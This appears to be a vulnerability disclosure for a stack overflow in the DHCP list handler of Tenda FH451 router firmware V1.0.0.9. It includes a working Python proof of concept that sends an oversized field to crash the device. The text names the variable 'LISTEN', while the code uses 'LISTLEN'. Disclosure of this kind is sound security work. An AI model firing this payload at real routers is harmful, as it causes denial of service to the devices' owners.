## Overview
Firmware download website: https://www.tenda.com.cn/download/detail-1629.html
## Affected version

FH451  V1.0.0.9
## Vulnerability details

Tenda FH451 V1.0.0.9  has a stack overflow vulnerability in the `fromDhcpListClient` function. We can set `LISTEN=1` and the program will enter line 30 and 33, which leads to a stack overflow vulnerability. Since the overflow overrides the `LISTEN` pointer variable, the `atoi` function will crash the program, causing a DOS attack in the second time looping.
![[2024-08-30 160030.png]]
## POC

```python
import requests
from pwn import*

ip = "192.168.109.145"
url = "http://" + ip + "/goform/DhcpListClient"
payload = b"a"*2000

data = {"LISTLEN":1,"page":1,"list1": payload}
response = requests.post(url, data=data)
print(response.text)
```

![[2024-08-30 155125.png]]